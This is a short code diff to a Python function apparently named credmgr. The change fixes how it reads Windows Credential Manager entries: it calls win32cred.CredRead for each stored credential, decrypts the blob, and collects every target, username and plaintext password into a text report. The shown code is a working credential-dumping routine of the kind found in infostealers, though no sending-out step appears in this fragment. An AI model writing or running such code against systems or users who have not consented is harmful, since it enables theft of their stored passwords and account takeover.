@@ -27,7 +27,8 @@ def credmgr():
             try:
                 target = cred['TargetName']
                 username = cred['UserName']
-                encrypted_password = cred['CredentialBlob']
+                cred_detail = win32cred.CredRead(target, cred['Type'], 0)
+                encrypted_password = cred_detail['CredentialBlob']
                 password = decrypt_password(encrypted_password) if encrypted_password else "N/A"
                 result += f"Target: {target}\nUsername: {username}\nPassword: {password}\n"
                 result += "----------------------------------------------------\n"
